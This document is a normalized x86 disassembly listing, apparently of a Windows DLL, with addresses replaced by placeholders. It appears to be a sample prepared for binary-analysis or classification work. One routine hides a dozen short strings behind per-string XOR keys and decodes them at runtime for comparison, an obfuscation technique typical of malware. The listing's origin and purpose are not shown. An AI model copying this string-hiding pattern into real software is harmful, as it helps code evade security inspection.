mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx edx
cmp [ ebx + 0xec ] 0x0
mov [ ebp - 0x128 ] eax
mov [ ebp - 0x12c ] ecx
jne r-xdata
push 0x4
lea esi [ ebp - 0x120 ]
mov edi ebx
call sub_10023b00
xor eax eax
mov [ ebp - 0x4 ] eax
push 0x2
push r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x70 ] 0xf
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x84 ] al
call sub_10043190
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov eax 0x42
jmp r-xdata
push esi
lea eax [ ebp - 0x120 ]
call sub_1004c5f0
push eax
push ebx
lea edi [ ebp - 0x84 ]
call sub_1001a220
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
push r--data
call sub_10050437
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
push esi
push ebx
lea eax [ ebp - 0x120 ]
call sub_1000e9c0
mov edx [ ebp - 0x128 ]
push edx
mov [ ebp - 0x130 ] eax
lea eax [ ebp - 0xbc ]
push r--data
push eax
call sub_100430c0
add esp 0xc
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_10050437
lea eax [ esi + 0x1c ]
push eax
lea eax [ ebp - 0x120 ]
call sub_1004c5f0
push eax
push ebx
lea edi [ ebp - 0xbc ]
call sub_1001a220
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_10050437
lea eax [ esi + 0x1c ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_1000e9c0
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0xd8 ]
push r--data
push edx
mov [ ebp - 0x128 ] eax
call sub_100430c0
add esp 0xc
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_10050437
lea eax [ esi + 0x38 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_1004c5f0
push eax
push ebx
lea edi [ ebp - 0xd8 ]
call sub_1001a220
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_10050437
lea eax [ esi + 0x38 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_1000e9c0
push 0x24ac4
lea esi [ ebp - 0x110 ]
mov [ ebp - 0x12c ] eax
call sub_1006a2d0
push eax
lea edx [ ebp - 0xa0 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x4
call sub_10021390
add esp 0x10
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0xfc ] 0x10
jb r-xdata
push r--data
call sub_10050437
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] 0x0
mov [ ebp - 0x110 ] 0x0
cmp ecx 0x3
ja r-xdata
mov eax [ ebp - 0x110 ]
push eax
call sub_1006591f
add esp 0x4
lea eax [ esi + 0x54 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_1004c5f0
push eax
push ebx
lea edi [ ebp - 0xa0 ]
call sub_1001a220
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
push r--data
call sub_10050437
lea eax [ esi + 0x54 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_1000e9c0
mov ecx [ ebp - 0x130 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x124 ] eax
call sub_100074a0
mov esi eax
lea eax [ ebp - 0x84 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x7
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x8
call sub_1006bcb0
mov ecx eax
mov [ ebp - 0x4 ] 0x9
mov esi [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub esi edi
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_10050437
push 0xffffffff
push 0x0
push ecx
mov ecx edi
call sub_10035d20
mov edi 0x10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_10050437
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x128 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0xbc ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xa
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xb
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0xc
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1006591f
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x1c ]
push esi
call sub_10035d20
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_10050437
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xd
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xe
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0xf
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1006591f
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x38 ]
push esi
call sub_10035d20
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_10050437
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x124 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x11
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0x12
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1006591f
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x54 ]
push esi
call sub_10035d20
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_10050437
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1006591f
add esp 0x4
lea ecx [ ebp - 0xf4 ]
push ecx
lea edi [ ebp - 0x120 ]
call sub_10055ba0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] 0x13
mov [ ebp - 0x124 ] esp
push 0xffffffff
xor esi esi
push esi
lea edx [ ebp - 0xf4 ]
mov edi 0xf
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] esi
push edx
mov [ ecx ] 0x0
call sub_100417c0
push esi
push ebx
call sub_10022030
mov ebx 0x10
mov [ ebp - 0x124 ] eax
cmp [ ebp - 0xe0 ] ebx
jb r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1006591f
add esp 0x4
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xe4 ] esi
mov [ ebp - 0xf4 ] 0x0
cmp [ ebp - 0x8c ] ebx
jb r-xdata
mov eax [ ebp - 0xf4 ]
push eax
call sub_1006591f
add esp 0x4
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x90 ] esi
mov [ ebp - 0xa0 ] 0x0
cmp [ ebp - 0xc4 ] ebx
jb r-xdata
mov ecx [ ebp - 0xa0 ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xc8 ] esi
mov [ ebp - 0xd8 ] 0x0
cmp [ ebp - 0xa8 ] ebx
jb r-xdata
mov edx [ ebp - 0xd8 ]
push edx
call sub_1006591f
add esp 0x4
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xac ] esi
mov [ ebp - 0xbc ] 0x0
cmp [ ebp - 0x70 ] ebx
jb r-xdata
mov eax [ ebp - 0xbc ]
push eax
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x120 ]
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] 0x0
cmp eax esi
je r-xdata
mov ecx [ ebp - 0x84 ]
push ecx
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x124 ]
mov edx [ ebp - 0x124 ]
push edx
mov edx [ ebp - 0x11c ]
lea ecx [ ebp - 0x114 ]
push ecx
push edx
push eax
call sub_10011560
mov eax [ ebp - 0x120 ]
push eax
call sub_1006591f
add esp 0x14
sub_10038df0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080c20
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x2
mov esi ecx
xor ebx ebx
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_10043190
mov [ ebp - 0x4 ] ebx
mov ecx [ esi ]
mov edx [ esi + 0x4 ]
mov eax 0xf
mov esi 0x10
mov [ ebp - 0x48 ] bl
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x38 ] 0x8
cmp eax esi
jae r-xdata
mov [ ecx + 0x8 ] bl
push 0xffffffff
push ebx
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_10035d20
cmp [ ebp - 0x34 ] esi
jb r-xdata
lea ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] esi
jae r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_1006591f
add esp 0x4
push edi
push 0x1
push eax
call [ StrToIntExA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] esi
jb r-xdata
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov al 0x1
mov eax [ ebp - 0x2c ]
push eax
call sub_1006591f
add esp 0x4
xor al al
jmp r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10038ef0
push esi
lea esi [ ebx - 0x1 ]
test esi esi
js r-xdata
xor edx edx
mov [ edi + ebx * 2 ] dx
pop esi
retn
jmp r-xdata
mov eax 0xcccccccd
mul ecx
shr edx 0x3
lea eax [ edx + edx * 4 ]
add eax eax
sub ecx eax
add ecx 0x30
dec esi
mov [ edi + esi * 2 + 0x2 ] cx
mov ecx edx
jns r-xdata
xor ecx ecx
mov [ edi + ebx * 2 ] cx
pop esi
retn
sub_10038f30
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
pop ebp
retn
mov edi edi
mov eax ecx
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_10038f50
push ebp
mov ebp esp
sub esp 0xe0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffe1
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x3
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffc9
and edx 0xff
mov [ ebp + eax * 2 - 0x64 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x58 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x78
and edx 0xff
mov [ ebp + eax * 2 - 0x74 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x68 ] ax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffc9
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x4
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x10 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x62
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x1a ] ax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffd3
and edx 0xff
mov [ ebp + eax * 2 - 0x34 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x28 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffec
and edx 0xff
mov [ ebp + eax * 2 - 0xa4 ] dx
inc eax
cmp eax 0xc
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x8c ] ax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff8b
and edx 0xff
mov [ ebp + eax * 2 - 0x54 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x48 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffe0
and edx 0xff
mov [ ebp + eax * 2 - 0xe0 ] dx
inc eax
cmp eax 0xe
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xc4 ] ax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffea
and edx 0xff
mov [ ebp + eax * 2 - 0x88 ] dx
inc eax
cmp eax 0x8
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x78 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff86
and edx 0xff
mov [ ebp + eax * 2 - 0x44 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x38 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x7b
and edx 0xff
mov [ ebp + eax * 2 - 0xc0 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
mov [ ebp - 0xa6 ] ax
mov eax [ ebp + 0x8 ]
dec eax
push esi
cmp eax 0x5
ja r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
jmp [ eax * 4 + jump_table_10039394 ]
mov esi [ lstrcmpW@IAT ]
lea ecx [ ebp - 0xc ]
push ecx
push edi
call esi
test eax eax
je r-xdata
mov esi [ lstrcmpW@IAT ]
lea ecx [ ebp - 0xc ]
push ecx
push edi
call esi
test eax eax
jne r-xdata
mov esi [ lstrcmpW@IAT ]
lea ecx [ ebp - 0x34 ]
push ecx
push edi
call esi
test eax eax
jne r-xdata
mov esi [ lstrcmpW@IAT ]
lea eax [ ebp - 0x44 ]
push eax
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x24 ]
push edx
push edi
call esi
test eax eax
je r-xdata
lea edx [ ebp - 0x64 ]
push edx
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x7
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0xa4 ]
push edx
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x88 ]
push ecx
push edi
call esi
test eax eax
jne r-xdata
mov eax 0xa
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x18 ]
push eax
push edi
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x74 ]
push eax
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x8
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x54 ]
push eax
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov eax 0xb
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov eax 0x9
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0xe0 ]
push ecx
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x5
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0xc0 ]
push edx
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x6
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov eax 0xc
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
sub_100393b0
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi + 0x4 ] eax
call sub_100796a0
add esp 0xc
pop esi
retn
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x4 ] 0x0
sub_100393ec
push 0x8
push r--data
call sub_10079bf0
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
xor edi edi
cmp eax edi
jne r-xdata
call sub_100206c3
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rw-data ] edi
jle r-xdata
call sub_10058100
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x3
jne r-xdata
call sub_10051dfe
push 0x214
push 0x1
call sub_1000977c
pop ecx
pop ecx
mov esi eax
cmp esi edi
je r-xdata
dec [ rw-data ]
mov [ ebp - 0x4 ] edi
cmp [ rw-data ] edi
jne r-xdata
call sub_100446ad
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_1002f427
mov [ rw-data ] eax
call sub_10028115
test eax eax
jns r-xdata
call sub_1000af1a
jmp r-xdata
call sub_10079c35
retn 0xc
xor eax eax
inc eax
push edi
call sub_10027339
pop ecx
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] edi
jne r-xdata
call sub_1001a767
call sub_100384de
test eax eax
js r-xdata
call sub_1001d628
jmp r-xdata
push esi
call sub_10022b5a
pop ecx
jmp r-xdata
push edi
push esi
call sub_100028b0
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
or [ esi + 0x4 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100394c5
jmp r-xdata
call sub_1000a952
call sub_1001d628
call sub_1000af1a
call sub_1000a952
jmp r-xdata
call sub_10002e28
test eax eax
js r-xdata
push 0x0
call sub_1001fe55
pop ecx
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_10039550
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x10 ]
mov eax [ ebp + 0x8 ]
cmp eax edx
ja r-xdata
push [ ebp + 0xc ]
sub eax edx
push eax
call sub_10008430
push 0xffffffff
push eax
call sub_1005f860
jmp r-xdata
pop ebp
retn 0x8
sub_10039580
push ebp
mov ebp esp
push ebx
mov ebx [ GetProcessHeap@IAT ]
push esi
mov esi ecx
push edi
xor edi edi
push 0x4
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x14 ] eax
push edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
call ebx
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x1c ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
call ebx
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x24 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
call ebx
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x2c ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
call ebx
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
push eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x3c ] edi
inc [ edi ]
call sub_1002a500
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x14
mov [ eax ] edi
mov edi eax
mov [ esi + 0x34 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
call ebx
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
sub_10039680
push ebp
mov ebp esp
push 0xffffffff
push sub_10080304
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
push esi
mov [ ebp - 0x4 ] 0x4
call sub_100155cc
mov eax [ esi + 0x1c ]
xor edi edi
add esp 0x4
cmp eax edi
je r-xdata
mov [ esi + 0x1c ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
push eax
call sub_10022b5a
add esp 0x4
mov [ esi + 0x14 ] edi
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
push eax
call sub_10022b5a
add esp 0x4
mov [ esi + 0xc ] edi
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
push eax
call sub_10022b5a
add esp 0x4
mov ecx esi
mov [ esi + 0x4 ] edi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10050f50
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push eax
call sub_10022b5a
add esp 0x4
sub_10039730
push ebp
mov ebp esp
push 0xffffffff
push sub_100820a8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x34 ] eax
mov ebx ecx
mov [ ebp - 0x30 ] edi
cmp eax edi
je r-xdata
push edi
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
push r--data
mov ecx esi
mov [ esi ] ax
call sub_100531b0
cmp ebx edi
je r-xdata
push edi
push edi
push ebx
push eax
push edi
push edi
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x30 ] eax
cmp eax edi
je r-xdata
push r--data
mov ecx esi
call sub_10012920
jmp r-xdata
lea eax [ eax + eax + 0x2 ]
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x34 ]
push ecx
mov edi eax
push edi
push ebx
push edx
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
